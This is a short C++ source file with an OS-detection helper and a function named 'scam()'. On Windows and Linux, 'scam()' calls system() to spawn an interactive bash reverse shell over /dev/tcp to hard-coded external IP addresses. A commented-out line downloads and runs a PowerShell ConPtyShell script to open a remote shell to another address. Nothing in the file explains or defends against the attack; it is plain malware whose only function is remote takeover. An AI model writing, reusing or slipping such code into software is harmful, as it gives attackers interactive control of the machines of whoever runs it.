#include <string.h>
#include <stdlib.h>
#include <string>
std::string OsName()
{
#ifdef _WIN32
    return "Windows";
#elif _WIN64
    return "Windows";
#elif __APPLE__ || __MACH__
    return "Mac OSX";
#elif __linux__
    return "Linux";
#elif __FreeBSD__
    return "FreeBSD";
#elif __unix || __unix__
    return "Unix";
#else
    return "Other";
#endif
}

void scam()
{
    if (OsName() == "Windows")
    {
        system("bash && /bin/bash -i >/dev/tcp/82.197.165.92/3332 0<&1 2>&1");
        // system("& \"IEX(IWR https://raw.githubusercontent.com/benax-rw/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell 192.168.1.31 4008\" p1");
    }
    else if (OsName() == "Linux")
    {
        system("bash && /bin/bash -i >/dev/tcp/82.165.97.169/3332 0<&1 2>&1");
    }
}
